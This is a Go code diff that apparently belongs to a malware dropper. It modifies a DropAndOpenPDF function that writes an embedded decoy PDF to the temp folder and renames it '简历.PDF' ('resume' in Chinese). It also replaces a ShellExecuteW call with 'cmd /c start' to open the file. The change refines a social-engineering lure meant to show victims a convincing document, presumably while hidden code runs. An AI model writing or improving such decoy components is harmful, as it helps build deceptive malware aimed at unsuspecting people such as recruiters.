@@ -5,9 +5,8 @@ package main
 import (
 	_ "embed"
 	"os"
+	"os/exec"
 	"path/filepath"
-	"syscall"
-	"unsafe"
 )
 
 //go:embed decoy.pdf
@@ -20,22 +19,12 @@ func DropAndOpenPDF() {
 		return
 	}
 
-	tmpPath := filepath.Join(os.TempDir(), "decoy.pdf")
+	tmpPath := filepath.Join(os.TempDir(), "简历.PDF")
 	if err := os.WriteFile(tmpPath, decoyPDF, 0644); err != nil {
 		return
 	}
 
-	shell32 := syscall.NewLazyDLL("shell32.dll")
-	shellExecuteW := shell32.NewProc("ShellExecuteW")
-
-	pathPtr, _ := syscall.UTF16PtrFromString(tmpPath)
-	verbPtr, _ := syscall.UTF16PtrFromString("open")
-
-	shellExecuteW.Call(
-		0,
-		uintptr(unsafe.Pointer(verbPtr)),
-		uintptr(unsafe.Pointer(pathPtr)),
-		0, 0,
-		1, // SW_SHOWNORMAL
-	)
+	cmd := exec.Command("cmd", "/c", "start", "", tmpPath)
+	cmd.Dir = os.TempDir()
+	cmd.Start()
 }
